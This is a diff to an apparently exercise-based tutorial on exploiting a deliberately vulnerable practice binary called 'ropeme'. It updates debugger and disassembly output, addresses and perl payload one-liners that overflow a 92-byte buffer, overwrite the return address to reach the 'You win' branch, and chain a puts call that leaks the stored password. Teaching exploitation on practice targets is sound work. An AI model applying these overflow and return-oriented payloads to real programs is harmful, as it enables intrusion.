@@ -16,14 +16,15 @@ You can trace calls to library functions with ltrace. This includes strcmp:
 ::
 
     $ ltrace ./ropeme admin42
-    __libc_start_main(0x400692, 2, 0x7fff9cc08e58, 0x400730 <unfinished ...>
-    strcmp("admin42", "admin42")                     = 0
-    printf("Enter password: ")                       = 16
-    fgets("test\n", 512, 0x7fd40a2d0900)             = 0x7fff9cc08d20
-    strcmp("test\n", "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227")
-    = -80
-    puts("Wrong password")                           = 15
-    Enter password: Wrong password
+    __libc_start_main(0x8048553, 2, 0xffe934a4, 0x80485b0 <unfinished ...>
+    strcmp("admin42", "admin42")                                         = 0
+    printf("Enter password:
+    ")                                          = 16
+    read(0, "test\n", 512)                                               = 5
+    strcmp("test\n",
+    "\304\263\303\271\303\260\342\210\222\303\267<>[\303\227") = -1
+    puts("Wrong password"Enter password: Wrong password
+    )                                               = 15
     +++ exited (status 1) +++
 
 
@@ -47,7 +48,7 @@ chars?
 
 ::
 
-    $ perl -e 'print "A" x 512' | ./ropeme admin42
+    $ perl -e 'print "A"x512' | ./ropeme admin42
       Segmentation fault      (core dumped) | ./ropeme admin42
 
 Oh! This smells the buffer overflow! To know where exactly we overwrite the
@@ -69,13 +70,16 @@ argument. We could use gdb but... well... radare2 ^^
 
     $ r2 -d rarun2 program=./ropeme arg1=admin42
         ...
-    [0x7fd31872dd80]> dc
-    Debugging pid = 12194, tid = 1 now
-    [0xf77aeb50]> dc
-    Enter password: <paste here from clipboard>
-    Wrong password
-    [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
-    [+] signal 11 aka SIGSEGV received 0
+     [0x7f2168f15d80]> dc
+     Debugging pid = 4050, tid = 1 now
+     [0xf7778b50]> dc
+     Enter password:
+     <paste here from clipboard>
+     Wrong password
+     [+] SIGNAL 11 errno=0 addr=0x41416641 code=1 ret=0
+     [+] signal 11 aka SIGSEGV received 0
+     [0x41416641]> woO 0x41416641
+     92
 
 Here we have the address at which it tried to return: 0x41416641
 Still in radare2 we convert it into an offset to know how much padding we
@@ -90,14 +94,15 @@ Let's try that!
 
 ::
 
-    $ perl -e 'print "A" x 92 . "B" x 4' | xclip
-    $ r2 -c "dc;dc" -d rarun2 program=./ropeme arg1=admin42
+    $ perl -e 'print "A"x92 . "B"x4' | xclip
+    $ r2 -c "dc;dc" -d rarun2 program=ropeme arg1=admin42
         ...
-    Enter password: <paste>
+    Enter password:
+    <paste>
     Wrong password
     [+] SIGNAL 11 errno=0 addr=0x42424242 code=1 ret=0
     [+] signal 11 aka SIGSEGV received 0
-     -- Find cp850 strings with 'e cfg.encoding=cp850' and '/s'
+     -- Fill the bug. Fill it with love. With the creamy and hot sauce of love.
     [0x42424242]>
 
 It works! We have taken eip! We just have to redirect it to section printing
@@ -107,69 +112,64 @@ the winning message. Let's disassemble the function checking the password:
 
     $ r2 ropeme
     [0x080483b0]> aa
-    [0x080483b0]> s sym.check_password
-    [0x080484e6]> pdf
-    ╒ (fcn) sym.check_password 145
+    [0x080483b0]> is | grep password
+    vaddr=0x08048496 paddr=0x00000496 ord=067 fwd=NONE sz=141 bind=GLOBAL type=FUNC name=check_password
+    [0x080484e6]> pdf @ sym.check_password
+    ╒ (fcn) sym.check_password 141
     │           ; var int local_22     @ ebp-0x58
-    │           ; CALL XREF from 0x080485c5 (sym.check_password)
-    │           0x080484e6    55             push ebp
-    │           0x080484e7    89e5           mov ebp, esp
-    │           0x080484e9    83ec58         sub esp, 0x58
-    │           0x080484ec    83ec0c         sub esp, 0xc
-    │           0x080484ef    6877860408     push str.Enter_password:
-    │           0x080484f4    e867feffff     call sym.imp.printf
-    │             ^- sym.imp.printf(unk)
-    │           0x080484f9    83c410         add esp, 0x10
-    │           0x080484fc    a160990408     mov eax, dword [obj.stdin__GLIBC_2.0]
-    │           0x08048501    83ec04         sub esp, 4
-    │           0x08048504    50             push eax
-    │           0x08048505    6800020000     push 0x200
-    │           0x0804850a    8d45a8         lea eax, [ebp-local_22]
-    │           0x0804850d    50             push eax
-    │           0x0804850e    e85dfeffff     call sym.imp.fgets
-    │             ^- sym.imp.fgets(unk, unk, unk)
-    │           0x08048513    83c410         add esp, 0x10
-    │           0x08048516    85c0           test eax, eax
-    │       ┌─< 0x08048518    7517           jne 0x8048531
-    │       │   0x0804851a    83ec0c         sub esp, 0xc
-    │       │   0x0804851d    6888860408     push str.Unable_to_get_the_password
-    │       │   0x08048522    e859feffff     call sym.imp.puts
-    │       │     ^- sym.imp.puts(unk)
-    │       │   0x08048527    83c410         add esp, 0x10
-    │       │   0x0804852a    b801000000     mov eax, 1
-    │      ┌──< 0x0804852f    eb44           jmp 0x8048575
-    │      │└─> 0x08048531    83ec08         sub esp, 8
-    │      │    0x08048534    68a3860408     push str.________________
-    │      │    0x08048539    8d45a8         lea eax, [ebp-local_22]
-    │      │    0x0804853c    50             push eax
-    │      │    0x0804853d    e80efeffff     call sym.imp.strcmp
-    │      │      ^- sym.imp.strcmp(unk, unk)
-    │      │    0x08048542    83c410         add esp, 0x10
-    │      │    0x08048545    85c0           test eax, eax
-    │     ┌───< 0x08048547    7517           jne 0x8048560
-    │     ││    0x08048549    83ec0c         sub esp, 0xc
-    │     ││    0x0804854c    68b4860408     push str.Yeah__You_win_
-    │     ││    0x08048551    e82afeffff     call sym.imp.puts
-    │     ││      ^- sym.imp.puts(unk)
-    │     ││    0x08048556    83c410         add esp, 0x10
-    │     ││    0x08048559    b800000000     mov eax, 0
-    │    ┌────< 0x0804855e    eb15           jmp 0x8048575
-    │    │└───> 0x08048560    83ec0c         sub esp, 0xc
-    │    │ │    0x08048563    68c3860408     push str.Wrong_password
-    │    │ │    0x08048568    e813feffff     call sym.imp.puts
-    │    │ │      ^- sym.imp.puts(unk)
-    │    │ │    0x0804856d    83c410         add esp, 0x10
-    │    │ │    0x08048570    b801000000     mov eax, 1
-    │    │ │    ; JMP XREF from 0x0804855e (sym.check_password)
-    │    │ │    ; JMP XREF from 0x0804852f (sym.check_password)
-    │    └─└──> 0x08048575    c9             leave
-    ╘           0x08048576    c3             ret
+    │           ; CALL XREF from 0x08048571 (sym.check_password)
+    │           0x08048496    55             push ebp
+    │           0x08048497    89e5           mov ebp, esp
+    │           0x08048499    83ec58         sub esp, 0x58
+    │           0x0804849c    83ec0c         sub esp, 0xc
+    │           0x0804849f    6817860408     push str.Enter_password:
+    │           0x080484a4    e887feffff     call sym.imp.puts
+    │           0x080484a9    83c410         add esp, 0x10
+    │           0x080484ac    83ec04         sub esp, 4
+    │           0x080484af    6800020000     push 0x200
+    │           0x080484b4    8d45a8         lea eax, [ebp-local_22]
+    │           0x080484b7    50             push eax
+    │           0x080484b8    6a00           push 0
+    │           0x080484ba    e861feffff     call sym.imp.read
+    │           0x080484bf    83c410         add esp, 0x10
+    │           0x080484c2    85c0           test eax, eax
+    │       ┌─< 0x080484c4    7517           jne 0x80484dd
+    │       │   0x080484c6    83ec0c         sub esp, 0xc
+    │       │   0x080484c9    6827860408     push str.Unable_to_get_the_password
+    │       │   0x080484ce    e85dfeffff     call sym.imp.puts
+    │       │   0x080484d3    83c410         add esp, 0x10
+    │       │   0x080484d6    b801000000     mov eax, 1
+    │      ┌──< 0x080484db    eb44           jmp 0x8048521
+    │      │└─> 0x080484dd    83ec08         sub esp, 8
+    │      │    0x080484e0    6842860408     push str.________________
+    │      │    0x080484e5    8d45a8         lea eax, [ebp-local_22]
+    │      │    0x080484e8    50             push eax
+    │      │    0x080484e9    e822feffff     call sym.imp.strcmp
+    │      │    0x080484ee    83c410         add esp, 0x10
+    │      │    0x080484f1    85c0           test eax, eax
+    │     ┌───< 0x080484f3    7517           jne 0x804850c
+    │     ││    0x080484f5    83ec0c         sub esp, 0xc
+    │     ││    0x080484f8    6853860408     push str.Yeah__You_win_
+    │     ││    0x080484fd    e82efeffff     call sym.imp.puts
+    │     ││    0x08048502    83c410         add esp, 0x10
+    │     ││    0x08048505    b800000000     mov eax, 0
+    │    ┌────< 0x0804850a    eb15           jmp 0x8048521
+    │    │└───> 0x0804850c    83ec0c         sub esp, 0xc
+    │    │ │    0x0804850f    6862860408     push str.Wrong_password
+    │    │ │    0x08048514    e817feffff     call sym.imp.puts
+    │    │ │    0x08048519    83c410         add esp, 0x10
+    │    │ │    0x0804851c    b801000000     mov eax, 1
+    │    └ └    ; JMP XREF from 0x0804850a (sym.check_password)
+    │    └ └    ; JMP XREF from 0x080484db (sym.check_password)
+    │    └─└──> 0x08048521    c9             leave
+    ╘           0x08048522    c3             ret
 
-Ok, so given the disassembly the key section is at 0x0804854c. Let's try that:
+
+Ok, so given the disassembly the key section is at 0x080484f8. Let's try that:
 
 ::
 
-    $ perl -e 'print "A" x 92 . "\x4c\x85\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x92 . "\xf8\x84\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
     Yeah! You win!
     Segmentation fault (core dumped)
@@ -236,34 +236,34 @@ The address of puts is direct:
 ::
 
     $ rabin2 -s ropeme | grep puts
-    vaddr=0x08048380 paddr=0x00000380 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
+    vaddr=0x08048330 paddr=0x00000330 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
 
-So [puts address] is 0x08048380. In the same way we find the password address:
+So [puts address] is 0x08048330. In the same way we find the password address:
 
 ::
 
     $ rabin2 -z ropeme
     ...
-    vaddr=0x080486a3 ... string=ĳùð−÷<>[×
+    vaddr=0x08048642 paddr=0x00000642 ordinal=004 sz=17 len=9 section=.rodata type=ascii string=ĳùð−÷<>[×
     ...
 
 By the way note how rabin2 isn't troubled at all by the weird password.
 
-So far our stack is something like: "80830408XXXXXXXXa3860408". Right now the
+So far our stack is something like: "30830408XXXXXXXX42860408". Right now the
 return address isn't really important, we will return to the end of the
 check_password function, just before the return statement, at address
-0x08048575.
+0x08048521.
 
 ::
 
     # Stack wanted:
     #
-    # ^ [password    address] = 0x080486a3
-    # | [puts return address] = 0x08048575
-    # | [puts        address] = 0x08048380
+    # ^ [password    address] = 0x08048642
+    # | [puts return address] = 0x08048521
+    # | [puts        address] = 0x08048330
     # | [padding to overflow] = "A" x 92
 
-    $ perl -e 'print "A" x 92 . "\x80\x83\x04\x08\x75\x85\x04\x08\xa3\x86\x04\x08"' | ./ropeme admin42
+    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\x42\x86\x04\x08"' | ./ropeme admin42
     Enter password: Wrong password
     ĳùð−÷<>[×
     Segmentation fault (core dumped)
@@ -275,4 +275,7 @@ Exercise 6
 
 We want to print an arbitrary message. The printing part can be done with
 puts() but what about the "getting the message" part? The program provides
-fgets(), and we can make use of it.
+read(), and we can make use of it.
+
+The read system call takes as argument a file descriptor, an address to write
+to and a length.
